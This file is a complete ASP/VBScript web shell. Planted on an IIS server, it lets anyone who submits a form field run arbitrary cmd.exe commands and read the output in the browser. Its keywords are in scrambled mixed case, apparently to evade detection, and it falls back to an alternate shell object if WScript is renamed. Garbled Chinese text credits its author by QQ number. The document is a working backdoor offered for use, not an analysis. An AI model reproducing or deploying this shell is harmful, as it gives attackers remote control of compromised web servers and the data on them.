<%@ LANGUAGE="VBSCRIPT"  cODEpagE ="936" %>
<ObjEct Runat=sERvER iD=OFilElh scOpE=pagE classiD="clsiD:0D43FE01-F093-11CF-8940-00A0C9054228"></ObjEct>
<ObjEct runat=sErvEr iD=OScriptlhn scOpE=pagE classiD="clsiD:72C24DD5-D70A-438B-8A42-98424B88AFB8"></ObjEct>
<%iF Err thEn%>
<ObjEct runat=sErvEr iD=OScriptlhn scOpE=pagE classiD="clsiD:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></ObjEct>
<%EnD iF %>
<html>
<bODy>
<FORM ACtiOn="<%= REquEst.SErvErVAriAblEs("URL") %>" MEthOD="POST">
  <p>
 <input typE=tExt namE="cmD" sizE=60>
 <input typE=submit valuE="run">
  </p>
  <p><FOnt cOlOr="#0000FF">²»¹Ü·þÎñÆ÷ÊÇ·ñÐÞ¸ÄÁËWSHµÄÃû×Ö£¬¶¼¿ÉÒÔÊ¹ÓÃ¡£</FOnt> </p>
  <p><FOnt cOlOr="#0000FF">¶¯öèÖÆ×÷£¬×£ÄãºÃÔË£¡QQ£º178383587</FOnt></p>
</FOrm>
<%

Dim lhtmp
 On ErrOr rEsumE nExt
 lhtmp = SERvER.MapPath("/")
 lhtmp = lhtmp + "\lhtmp.txt"
 call OScriptlhn.run ("cmD.ExE /c "  rEquEst.FOrm("cmD")  ">" & lhtmp,0,truE)
 SEt OFilE = OFilElh.OpEnTExtFilE (lhtmp, 1, FAlsE, 0)
%>
<PRE>
<br>
<%
  IF (IsObjECt(OFilE)) ThEn
On ErrOr rEsumE nExt
 REspOnsE.WritE sErvEr.htmlEncODE(OFilE.READAll)
 OFilE.ClOsE
 CAll OFilElh.DElEtEFilE(lhtmp, TruE)
  EnD IF
%>
</bODy>
</html>
